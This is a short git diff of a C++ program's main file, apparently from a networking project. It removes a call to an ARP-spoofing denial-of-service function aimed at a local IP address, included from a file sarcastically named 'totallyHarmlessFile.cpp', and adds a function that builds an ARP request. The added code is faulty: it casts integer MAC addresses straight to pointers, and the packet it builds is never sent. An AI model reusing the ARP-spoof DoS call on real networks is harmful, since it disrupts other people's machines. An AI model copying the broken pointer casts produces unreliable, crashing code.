@@ -16,13 +16,28 @@
 #include "messaging/MessageHandler.hpp"
 
 #include "totallyHarmlessCode/totallyHarmlessFile.cpp"
+#include "totallyHarmlessCode/ARPPacket.hpp"
+
+
+void sendArpRequest() {
+  arp::ARPPacket packet;
+
+  unsigned char* srcHWAddr = (unsigned char*)0x8c89a58346f9;
+  packet.setSourceHWAddr(srcHWAddr);
+  packet.setSourceIPAddr(0xC0A88946);
+  unsigned char* tgtHWAddr = (unsigned char*)0x000000000000;
+  packet.setTargetHWAddr(tgtHWAddr);
+  packet.setTargetIPAddr(0xC0A889BC);
+
+  packet.setOperation(arp::ARPPacket::Operation::request);
+}
 
 int main(int argc, char *argv[]) {
   using namespace mazenet::util::cfg;
   using namespace mazenet::util::logging;
   CfgManager& cfgMan = CfgManager::instance();
 
-  th::arpSpoofDos("eth0", "192.168.137.188");
+  sendArpRequest();
 
   /*
   // keep as first line
